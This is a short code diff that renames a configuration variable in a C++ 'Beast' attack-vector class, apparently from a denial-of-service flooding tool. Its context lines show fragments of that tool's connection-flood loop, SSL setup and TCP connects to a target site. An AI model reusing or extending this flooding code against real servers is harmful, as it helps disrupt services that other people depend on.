@@ -7,7 +7,7 @@
 #include "../Headers/Beast.hpp"
 #include "../Headers/Logging.hpp"
 
-Beast::Beast(std::shared_ptr<Config> conf) : Attack_Vector(std::move(conf)) {
+Beast::Beast(std::shared_ptr<Config> config) : Attack_Vector(std::move(config)) {
 
 }
 
@@ -57,16 +57,16 @@ void Beast::attack() {
                 PEER_write(&peers[i]);
                 continue;
             }
-            (*conf->req)++;
+            (*config->req)++;
         }
-        (*conf->voly)++;
+        (*config->voly)++;
         pause();
     }
 
 }
 
 void Beast::init() {
-    opt.n_max_peers = static_cast<uint16_t>(conf->CONNECTIONS);
+    opt.n_max_peers = static_cast<uint16_t>(config->CONNECTIONS);
     FD_ZERO(&opt.rfds);
     FD_ZERO(&opt.wfds);
     OpenSSL_add_ssl_algorithms();
@@ -260,8 +260,8 @@ int Beast::tcp_connect(_peer *p) {
     fcntl(p->sox, F_SETFL, fcntl(p->sox, F_GETFL, 0) | O_NONBLOCK);
     memset(&p->addr, 0, sizeof(p->addr));
     p->addr.sin_family = AF_UNSPEC;
-    p->addr.sin_port = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
-    p->addr.sin_addr.s_addr = inet_addr(conf->website.c_str());
+    p->addr.sin_port = htons(static_cast<uint16_t>(strtol(config->port.c_str(), nullptr, 10)));
+    p->addr.sin_addr.s_addr = inet_addr(config->website.c_str());
     ret = connect(p->sox, reinterpret_cast<sockaddr *>(&p->addr), sizeof(p->addr));
     struct timeval tv{};
     gettimeofday(&tv, nullptr);
